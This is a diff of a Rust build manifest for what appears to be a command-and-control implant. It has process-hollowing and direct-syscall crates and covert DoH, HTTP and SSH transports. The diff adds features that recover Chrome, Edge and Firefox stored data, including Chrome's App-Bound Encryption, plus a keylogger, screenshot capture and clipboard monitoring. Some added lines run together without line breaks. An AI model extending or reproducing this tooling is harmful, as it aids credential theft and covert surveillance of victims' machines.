@@ -79,7 +79,7 @@ enigo = { version = "0.2", optional = true }
 enigo = { version = "0.2", optional = true }
 winreg = "0.52"
 image = { version = "0.25", optional = true }
-winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr"] }
+winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr", "dpapi", "wincrypt", "errhandlingapi", "namedpipeapi"] }
 hollowing = { path = "../hollowing" }
 nt_syscall = { path = "../nt_syscall" }
 
@@ -150,7 +150,13 @@ doh-transport = []
 # When enabled and cdn_relay=true is set in agent.toml, the agent tunnels
 # C2 traffic over HTTP/S using the malleable profile headers/URIs.
 http-transport = []
-# Activate the SSH covert transport (c2_ssh::SshTransport).
+# Browser stored-data recovery: Chrome (including App-Bound Encryption v127+),
+# Edge, and Firefox.  Windows-only.  No extra crate dependencies beyond what is
+# already in the agent dependency tree.
+browser-data = []# Surveillance capabilities: screenshot capture (multi-monitor), keylogger
+# (WH_KEYBOARD_LL with encrypted buffer), and clipboard monitoring (polling
+# thread with encrypted buffer).  Pulls in `dep:image` for PNG encoding.
+surveillance = ["dep:image"]# Activate the SSH covert transport (c2_ssh::SshTransport).
 # When enabled and ssh_host is set in agent.toml, the agent tunnels C2
 # traffic through an SSH session channel.  Add russh and russh-keys to the
 # dependency set; requires no native OpenSSL library — all crypto is
